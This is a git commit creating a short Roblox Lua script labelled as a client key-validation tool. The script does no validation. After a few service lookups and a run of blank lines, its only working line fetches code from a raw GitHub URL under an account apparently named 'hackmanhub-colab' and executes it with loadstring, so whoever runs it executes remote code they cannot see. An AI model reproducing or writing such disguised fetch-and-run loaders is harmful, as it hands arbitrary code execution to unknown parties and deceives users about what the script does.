ba1dfbc37fd7bfc3502dd40cb49eabb7c3a7a0cf
ghghkxkmfklodfgl <ali.kinil@icloud.com>
2025-09-01 15:11:17 +0300

    Create tk.lua

---
+++ tk.lua
@@ -0,0 +1,12 @@
+--===[ Ov2.5 Client Key Validation V3.1 Beta ]===--
+
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+local StarterGui = game:GetService("StarterGui")
+
+
+     
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hackmanhub-colab/t/refs/heads/main/m.txt"))()
